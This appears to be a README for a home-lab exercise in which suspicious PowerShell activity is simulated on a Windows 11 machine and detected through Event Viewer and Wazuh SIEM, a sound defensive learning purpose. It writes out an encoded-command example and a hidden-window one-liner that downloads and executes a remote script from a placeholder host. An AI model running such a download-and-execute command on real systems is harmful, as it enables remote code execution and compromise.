# powershell-sus-activity-lab
## Overview
This lab simulates suspicious PowerShell activity on a Windows 11 endpoint and demonstrates how it is logged in Event Viewer and detected by Wazuh SIEM.

It’s designed as part of a broader cybersecurity home lab focused on learning how to detect malicious behavior in enterprise environments.

---

## Lab Environment

- **Endpoint**: Windows 11 (Test Machine)
- **SIEM**: Wazuh Server
- **Logging Sources**: Windows Event Viewer, Wazuh Alerts

---

## Simulation 1: Encoded PowerShell Command

### Command:
```powershell
powershell -EncodedCommand aABpAA==
```

---

This command executes _hi_ using Base64-encoded input, simulating obfuscation — a common attacker tactic.

### Detection:
- **Event Viewer:** Captured Event ID 4688 (Process Creation)

- **Wazuh:** Detected suspicious EncodedCommand usage

  - **Alert Level:** 5

---

## Simulation 2: Remote Script Execution

### Command:
```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://testsite/malicious.ps1')"
```

---

This mimics an attacker downloading and executing a remote script using PowerShell.

### Detection:
- **Event Viewer:**

  - Event ID 4104 (Script Block Logging)

  - Event ID 4688 (Process Creation)

- **Wazuh:** Alert triggered due to suspicious use of IEX and DownloadString

  - Alert Level:10

---

## Key Takeaways
PowerShell is a powerful tool often abused in attacks.

- Encoded commands and remote script execution are red flags.

- Windows and Wazuh can detect and log these behaviors with proper configuration.

- This lab reinforces detection strategy for common PowerShell-based threats.
